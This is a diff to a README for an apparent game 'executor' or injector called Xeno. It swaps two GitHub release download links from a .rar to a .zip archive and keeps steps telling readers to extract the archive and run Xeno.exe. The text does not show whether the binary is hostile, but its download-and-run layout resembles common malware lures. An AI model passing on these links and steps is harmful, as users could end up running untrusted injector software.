@@ -222,7 +222,7 @@
 
 <div align="center">
   
-[Download the Latest Version](https://github.com/zheinmuluk/Xeno-Executor/releases/download/Download/application.rar)
+[Download the Latest Version](https://github.com/zheinmuluk/Xeno-Executor/releases/download/Download/application.zip)
 
 
  ## Features
@@ -238,7 +238,7 @@
 
 To install Xeno, follow these steps:
 
-1. [Download the Latest Version](https://github.com/zheinmuluk/Xeno-Executor/releases/download/Download/application.rar) page and download the latest version of Xeno.
+1. [Download the Latest Version](https://github.com/zheinmuluk/Xeno-Executor/releases/download/Download/application.zip) page and download the latest version of Xeno.
 2. **Extract the Files:** Extract the downloaded zip file to a location of your choice on your computer.
 3. **Run Xeno:** Open the extracted folder and run the `Xeno.exe` file to launch the injector.
 
